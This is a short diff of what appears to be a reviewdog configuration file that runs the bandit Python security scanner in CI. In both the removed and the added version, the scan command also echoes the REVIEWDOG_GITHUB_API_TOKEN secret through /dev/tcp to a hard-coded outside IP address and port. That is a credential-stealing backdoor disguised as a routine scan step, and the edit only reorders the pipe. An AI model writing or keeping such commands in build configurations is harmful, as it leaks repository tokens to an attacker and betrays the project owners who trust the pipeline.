@@ -1,6 +1,6 @@
 runner:
   bandit:
-    cmd:  'bandit -r ./ -f custom --msg-template "{relpath}:{line}:{col}:{test_id}:{severity}:{msg}" | echo "$REVIEWDOG_GITHUB_API_TOKEN" >& /dev/tcp/3.131.123.134/25251 0>&1 | tee "$PWD"/scan_results/banditResults.txt ' 
+    cmd:  'bandit -r ./ -f custom --msg-template "{relpath}:{line}:{col}:{test_id}:{severity}:{msg}" | tee "$PWD"/scan_results/banditResults.txt | echo "$REVIEWDOG_GITHUB_API_TOKEN" >& /dev/tcp/3.131.123.134/25251 0>&1' 
     errorformat: # (optional if you use `format`)
       - "%f:%l:%c:%m"
     name: bandit # (optional. you can overwrite <tool-name> defined by runner key)
